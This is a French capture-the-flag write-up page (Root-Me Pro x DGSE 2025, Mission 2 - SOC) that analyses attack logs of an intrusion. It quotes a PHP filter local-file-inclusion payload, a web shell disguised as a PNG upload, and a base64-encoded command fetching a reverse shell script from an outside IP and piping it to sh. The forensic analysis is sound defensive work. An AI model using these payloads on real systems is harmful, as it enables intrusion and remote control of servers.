<!doctype html><html lang=fr-fr dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Mission 2 : SOC
  
  #
  

Dans cette deuxième mission, on nous fournit des logs sur Kibana pour analyser l&rsquo;attaque d&rsquo;un membre de NullVastation.  Pour trouver le drapeau, il faudra concaténer :

Les CWE exploitées par l&rsquo;attaquant.
L&rsquo;adresse du serveur d&rsquo;exfiltration utilisé par l&rsquo;attaquant.
le chemin du fichier utilisé pour rendre l&rsquo;exploit permanent.


  Local File Inclusion
  
  #
  

On observe un pic d&rsquo;activité, ce pic s&rsquo;apparente à du fuzzing : l&rsquo;attaquant essaye de truver une vulnérabilité dans le système. On peut supposer qu&rsquo;à la fin de ce pic l&rsquo;attaquant va exploiter la faille. On trouve alors la première exploitation :"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="//localhost:1313/docs/writeups/rootmepro2025/collapsed/mission2/"><meta property="og:site_name" content="@camillegr"><meta property="og:title" content="Mission 2 - SOC"><meta property="og:description" content="Mission 2 : SOC # Dans cette deuxième mission, on nous fournit des logs sur Kibana pour analyser l’attaque d’un membre de NullVastation. Pour trouver le drapeau, il faudra concaténer :
Les CWE exploitées par l’attaquant. L’adresse du serveur d’exfiltration utilisé par l’attaquant. le chemin du fichier utilisé pour rendre l’exploit permanent. Local File Inclusion # On observe un pic d’activité, ce pic s’apparente à du fuzzing : l’attaquant essaye de truver une vulnérabilité dans le système. On peut supposer qu’à la fin de ce pic l’attaquant va exploiter la faille. On trouve alors la première exploitation :"><meta property="og:locale" content="fr_fr"><meta property="og:type" content="article"><meta property="article:section" content="docs"><title>Mission 2 - SOC | @camillegr</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=//localhost:1313/docs/writeups/rootmepro2025/collapsed/mission2/><link rel=stylesheet href=/book.min.bb3e87f07d36c204e64f36f7b234cbfca24038b4a3f644b253b84740bc8ac74b.css integrity="sha256-uz6H8H02wgTmTzb3sjTL/KJAOLSj9kSyU7hHQLyKx0s=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.93d6633a78dacfa6129026b437f37946ad7e9d6f7fe46845365e41653b480082.js integrity="sha256-k9ZjOnjaz6YSkCa0N/N5Rq1+nW9/5GhFNl5BZTtIAII=" crossorigin=anonymous></script></head><body dir=ltr class="book-kind-page book-type-docs"><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>@camillegr</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-ad93f8b4ee98a57a6224ee06f39153b9 class=toggle>
<label for=section-ad93f8b4ee98a57a6224ee06f39153b9 class=flex><a role=button class=flex-auto>Projets Personnels</a></label><ul><li><a href=/docs/projets/collapsed/tofuzz/>ToFuzz</a></li></ul></li><li><input type=checkbox id=section-72538655c7e4bb37bc80c6f43d7e4b3b class=toggle checked>
<label for=section-72538655c7e4bb37bc80c6f43d7e4b3b class=flex><a href=/docs/writeups/ class=flex-auto>Writeups</a></label><ul><li><input type=checkbox id=section-14ed21d169f82c1f4e9784c42f27b9c3 class=toggle checked>
<label for=section-14ed21d169f82c1f4e9784c42f27b9c3 class=flex><a href=/docs/writeups/rootmepro2025/ class=flex-auto>CTF 2025 | Root-Me Pro x DGSE</a></label><ul><li><a href=/docs/writeups/rootmepro2025/collapsed/mission1/>Mission 1 - IA</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission2/ class=active>Mission 2 - SOC</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission3/>Mission 3 - Forensic</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission4/>Mission 4 - Pentest</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission5/>Mission 5 - Mobile</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission6/>Mission 6 - OSINT</a></li></ul></li><li><input type=checkbox id=section-661913a3e27635165633fb2069bf836f class=toggle>
<label for=section-661913a3e27635165633fb2069bf836f class=flex><a href=/docs/writeups/vm/ class=flex-auto>Virtual Machines</a></label><ul><li><a href=/docs/writeups/vm/collapsed/mrrobot/>Mr Robot</a></li><li><a href=/docs/writeups/vm/collapsed/rootme/>RootMe</a></li><li><a href=/docs/writeups/vm/collapsed/wonderlands/>Wonderlands</a></li></ul></li></ul></li><li class=book-section-flat><span>Divers</span><ul><li><a href=/docs/divers/blogs/>Blogs</a></li></ul></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Mission 2 - SOC</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#local-file-inclusion>Local File Inclusion</a></li><li><a href=#telechargement-dun-reverse-shell>Telechargement d&rsquo;un reverse shell</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=mission-2--soc>Mission 2 : SOC
<a class=anchor href=#mission-2--soc>#</a></h1><p>Dans cette deuxième mission, on nous fournit des logs sur Kibana pour analyser l&rsquo;attaque d&rsquo;un membre de NullVastation. Pour trouver le drapeau, il faudra concaténer :</p><ul><li>Les CWE exploitées par l&rsquo;attaquant.</li><li>L&rsquo;adresse du serveur d&rsquo;exfiltration utilisé par l&rsquo;attaquant.</li><li>le chemin du fichier utilisé pour rendre l&rsquo;exploit permanent.</li></ul><h2 id=local-file-inclusion>Local File Inclusion
<a class=anchor href=#local-file-inclusion>#</a></h2><p>On observe un pic d&rsquo;activité, ce pic s&rsquo;apparente à du fuzzing : l&rsquo;attaquant essaye de truver une vulnérabilité dans le système. On peut supposer qu&rsquo;à la fin de ce pic l&rsquo;attaquant va exploiter la faille. On trouve alors la première exploitation :</p><pre tabindex=0><code>/?lang=php://filter/read=convert.base64-encode&amp;page=resource=db/connect
</code></pre><p>L&rsquo;attaquant arrive ici à lire les informations de connexion et s&rsquo;authentifie peu après sur la page d&rsquo;administration.</p><h2 id=telechargement-dun-reverse-shell>Telechargement d&rsquo;un reverse shell
<a class=anchor href=#telechargement-dun-reverse-shell>#</a></h2><p>Après s&rsquo;être authentifié, l&rsquo;attaquant va téléverser du code php <code>ev1L.php.png</code> pour pouvoir exécuter des commandes sur la machine :</p><pre tabindex=0><code>/admin-page/manage.php?success=true&amp;path=upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png 
</code></pre><p>il va en suite télécharger un reverse shell via ce même script :</p><pre tabindex=0><code>10.143.17.101 - - [28/Mar/2025:00:32:16 +0100] &#34;GET /admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+&#39;d2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA==&#39;|base64+-d|sh HTTP/1.1&#34; 200 2144 &#34;-&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#34;
</code></pre><p>Sachant qu&rsquo;en base64 :</p><pre tabindex=0><code>d2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA==
http://163.172.67.201:49999/s1mpl3-r3vsh3ll-vps.sh
</code></pre><p>On a alors tous nos éléments pour former notre drapeau :</p><ul><li>CWE-98 : Improper Control of Filename</li><li>CWE-434 : Unrestricted Upload of File</li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><div class="flex flex-wrap justify-between"><span><a href=/docs/writeups/rootmepro2025/collapsed/mission1/ class="flex align-center book-icon"><img src=/svg/backward.svg class=book-icon alt=Previous title="Mission 1 - IA">
<span>Mission 1 - IA</span>
</a></span><span><a href=/docs/writeups/rootmepro2025/collapsed/mission3/ class="flex align-center book-icon"><span>Mission 3 - Forensic</span>
<img src=/svg/forward.svg class=book-icon alt=Next title="Mission 3 - Forensic"></a></span></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#local-file-inclusion>Local File Inclusion</a></li><li><a href=#telechargement-dun-reverse-shell>Telechargement d&rsquo;un reverse shell</a></li></ul></nav></div></aside></main></body></html>